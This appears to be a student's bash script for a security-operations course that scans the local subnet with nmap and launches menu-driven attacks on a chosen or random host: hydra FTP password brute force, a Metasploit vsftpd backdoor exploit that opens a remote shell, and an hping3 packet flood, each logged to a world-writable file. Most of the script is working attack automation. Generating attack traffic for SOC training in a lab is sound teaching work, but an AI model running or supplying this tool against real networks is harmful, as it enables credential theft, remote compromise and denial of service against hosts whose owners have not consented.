#!/bin/bash

# Student name: Eddie Alon Student Code: s8
# Class: TMAGEN77369
# Lecturer: Simon Bar


# Function for interactive introduction
function INTRODUCING ()
{
        figlet "SOC Checking"
}

# Function that retrieving the addresses of the network, and showing them
function NET ()
{
	NET=$(ip -4 address | grep eth0 | grep brd | awk '{print $2}') # Using special command for extracting by greps (there is more then on interface - also for bridged)
                                                                       # and awk the net and net mask, in form of net\mask_number_of_binary_digits
	nmap -sn $NET | grep "Nmap scan report for" | cut -d " " -f5 > ips_net.txt # Extracting list of all the hosts using grep of -sn flag of nmap
                                                                                                          # for doing only host discovery without port scan, as if to say
                                                                                                          # only the hosts that respond to the scan like ping scan
	echo "The ip addresses of the network are as follow:"
	cat ips_net.txt # Showing the addresses of the net
	echo ""
}
# Function doing the menu of the attacks (or random attack) and and calling the functions of each attack
function MENU_ATTACKS ()
{
	sudo touch /var/log/soc.log # Creating the log file with root permissions
	sudo chmod 777 /var/log/soc.log # Making the log file with full permissions
	sudo echo "" > /var/log/soc.log
	while true # Run the menu, each time after an attack, except invalid answer
	do
		echo "Choose an attack:"
		echo "1. Brute force attack by hydra"
		echo "2. Msfconsole create shell attack"
		echo "3. Hping3 DDOS flood packet attack"
		echo "4. Random attack from the 3 above"
		echo ""
		read choice # Taking the answer from the user according to the menu
		echo ""
		if [ $choice -eq 1 ] # hydra attack
		then
			HYDRA_AND_LOG
		elif [ $choice -eq 2 ] # msfconsole attack
		then
			MSFCONSOLE_AND_LOG
		elif [ $choice -eq 3 ] # hping3 attack
		then
			HPING3_AND_LOG
		elif [ $choice -eq 4 ] # Choose random attack from the list
		then
			random=$(shuf -i 1-3 -n 1) # Insert a variable random index from the menu (1-3) after shuffling from 1,2 or 3 (from the i flag)
						   #  and outputs only one random number (from the n flag)
			if [ $random -eq 1 ] # Again as above
			then
				HYDRA_AND_LOG
			elif [ $random -eq 2 ]
			then
				MSFCONSOLE_AND_LOG
			elif [ $random -eq 3 ]
			then
				HPING3_AND_LOG
			fi
		else
			exit
		fi
	done
}

# Function that doing the hydra attack with chosen target (or random ip from the net) and log it
function HYDRA_AND_LOG ()
{
	while true # Keep trying do the loop until a valid choice is inserted
	do
		echo "This attack is brute force attack by hydra, using userlist and password list, against the chosen ip throurgh ftp service:"
		echo ""
		echo "You can choose a target ip to attack:"
		echo "1. A target ip you choose from the net"
		echo "2. Random ip from the net"
		echo ""
		read choice
		if [ $choice -eq 1 ] # For manually insering target ip
		then
			echo "Insert ip target from the net:"
			cat ips_net.txt # Showing all the addresses of the net for helping the user to choose one of them
			echo ""
			read ip # Taking the address ip from the user
		elif [ $choice -eq 2 ] # For random target ip
		then
			lines_num=$(cat ips_net.txt | wc -l) # Insert a variable the number of lines
			random_line=$(shuf -i 1-$lines_num -n 1) # Insert a variable one output from 1 to the number of lines (number of ips in the net)
			ip=$(sed -n "${random_line}p" ips_net.txt) # retrieving an ip target from the randomed respective line chosen in the previous command
		else
			echo "Invalid answer, try again."
			echo ""
			continue # If the answer is not 1 or 2, letting the user to choose again correctly
		fi
		start_time=$(date +%s) # Insert to variable the time seconds in epoch time of start time before the attack
		hydra -L user_list -P pass_list $ip ftp # Attacking the target ip by hydra using user list and password list through service ftp
							#There is need to add user_list and pass_list in the path the program is running
		end_time=$(date +%s) # Insert to variable the time seconds in epoch time of end time after the attack
		runtime=$((end_time-start_time)) # Calculating difference of end time and of start time
		ip_attacker=$(hostname -I | cut -d ' ' -f1) # Retrieving the ip of the attacker
		# Appending to log file the type of the attack, the ips of the attacker and of the victim and the time of the execution of the attack
		sudo echo "Brute force attack by hydra, attacker ip $ip_attacker attacked the victim ip - $ip -  during time execution of $runtime seconds" >> /var/log/soc.log
		sudo cat /var/log/soc.log # Showing the current content of the  log file
		echo ""
		break
	done
}

# Function the same as last function just doing the msfconsole attack and log it
function MSFCONSOLE_AND_LOG ()
{
	while true
	do
		echo "This attack is by  msfconsole - creating shell through exploiting vsftpd against the chosen ip:"
		echo ""
		echo "You can choose a target ip to attack:"
		echo "1. A target ip you choose from the net"
		echo "2. Random ip from the net"
		echo ""
		read choice
		if [ $choice -eq 1 ]
		then
			echo "Insert ip target from the net:"
			cat ips_net.txt
			echo ""
			read ip
		elif [ $choice -eq 2 ]
		then
			lines_num=$(cat ips_net.txt | wc -l)
			random_line=$(shuf -i 1-$lines_num -n 1)
			ip=$(sed -n "${random_line}p" ips_net.txt)
		else
			echo "Invalid answer, try again."
			echo ""
			continue
		fi
		start_time=$(date +%s)
		msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts $ip; exploit;" # Doing the msfconsole attack automatically in quiet mode (minimal output) and execute
												      # the exploit of payload of vsftpd backdoor, creating a shell on the victim.
												      # There is need to do ctrl-c, y and enter and then exit, to end the attack.
                end_time=$(date +%s)
                runtime=$((end_time-start_time))
                ip_attacker=$(hostname -I | cut -d ' ' -f1)
                sudo echo "Creating shell attack by msfconsole, attacker ip $ip_attacker attacked the victim ip - $ip -  during time execution of $runtime seconds" >> /var/log/soc.log
                sudo cat /var/log/soc.log
                echo ""
		break
	done
}

# Function the same as last two functions just doing the hping3 DDOS attack and log it
function HPING3_AND_LOG ()
{
	while true
	do
	echo "This attack is DDos Attack by HPING3, flooding the victim by sending many packets against the chosen ip:"
		echo ""
		echo "You can choose a target ip to attack:"
		echo "1. A target ip you choose from the net"
		echo "2. Random ip from the net"
		echo ""
		read choice
		if [ $choice -eq 1 ]
		then
			echo "Insert ip target from the net:"
			cat ips_net.txt
			echo ""
			read ip
		elif [ $choice -eq 2 ]
		then
			lines_num=$(cat ips_net.txt | wc -l)
			random_line=$(shuf -i 1-$lines_num -n 1)
			ip=$(sed -n "${random_line}p" ips_net.txt)
		else
			echo "Invalid answer, try again."
			echo ""
			continue
		fi
		start_time=$(date +%s)
		sudo hping3 "$ip" --flood # This is the actual attack by hping3, flooding the victim with a lot of packets. There is need to insert ctrl-c to end the attack.
                end_time=$(date +%s)
                runtime=$((end_time-start_time))
                ip_attacker=$(hostname -I | cut -d ' ' -f1)
                sudo echo "DDOS flooding attack by hping, attacker ip $ip_attacker attacked the victim ip - $ip -  during time execution of $runtime seconds" >> /var/log/soc.log
                sudo cat /var/log/soc.log
                echo ""
		break
	done
}

# The primary function to call several functions
MAIN ()
{
        INTRODUCING
	NET
	MENU_ATTACKS
}

MAIN
